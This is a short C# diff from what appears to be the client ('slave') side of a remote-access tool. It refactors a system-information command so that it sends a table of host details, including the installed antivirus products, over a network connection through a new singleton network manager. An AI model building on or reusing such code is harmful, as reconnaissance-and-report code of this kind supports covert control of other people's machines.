@@ -6,6 +6,7 @@ using System.Linq;
 using System.Management;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
+using Slave.Core;
 
 namespace Slave.Commands
 {
@@ -31,8 +32,8 @@ namespace Slave.Commands
                 new Tuple<string, string>("Antivirus", GetInstalledAntivirus().Aggregate((current, av) => $"{current} , {av}"))
             };
 
-            SlaveCommandsManager.networkManager.WriteLine(SlaveCommandsManager.TableDisplay(infos));
-            SlaveCommandsManager.networkManager.WriteLine("{end}");
+            SlaveNetworkManager.GetInstance().WriteLine(SlaveCommandsManager.TableDisplay(infos));
+            SlaveNetworkManager.GetInstance().WriteLine("{end}");
         }
 
         string TimespanAsString(TimeSpan t)
